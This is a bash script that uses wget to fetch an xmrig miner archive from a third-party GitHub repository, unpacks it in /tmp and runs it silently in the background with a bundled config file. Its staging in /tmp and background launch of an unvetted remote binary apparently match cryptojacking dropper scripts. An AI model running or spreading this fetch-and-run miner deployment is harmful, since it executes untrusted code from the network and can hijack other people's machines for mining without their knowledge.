#!/bin/bash

LOG_FILE="/tmp/miner.log"

echo "Starting the script..." > "$LOG_FILE"

# Set up environment (if needed)
# source /etc/profile
# source ~/.bashrc

echo "Current directory: $(pwd)" >> "$LOG_FILE"

# Download xmrig and extract it
wget https://github.com/orkaroeli/orkaroeliminer/raw/refs/heads/main/xmrigtar.tar.gz -O /tmp/xmrigtar.tar.gz >> "$LOG_FILE" 2>&1

# Check if the download was successful
if [ $? -eq 0 ]; then
    echo "Download successful." >> "$LOG_FILE"
else
    echo "Download failed." >> "$LOG_FILE"
    exit 1
fi

# Extract the tar.gz file
tar -xvf /tmp/xmrigtar.tar.gz -C /tmp >> "$LOG_FILE" 2>&1

# Navigate to the xmrig directory
cd /tmp/xmrig-6.22.0 || { echo "Failed to change directory to xmrig-6.22.0" >> "$LOG_FILE"; exit 1; }

# Set the correct permissions for xmrig
chmod +x xmrig >> "$LOG_FILE" 2>&1

# Run xmrig in the background
echo "Starting xmrig..." >> "$LOG_FILE"
./xmrig --config=config.json >> "$LOG_FILE" 2>&1 &

echo "Script finished." >> "$LOG_FILE"
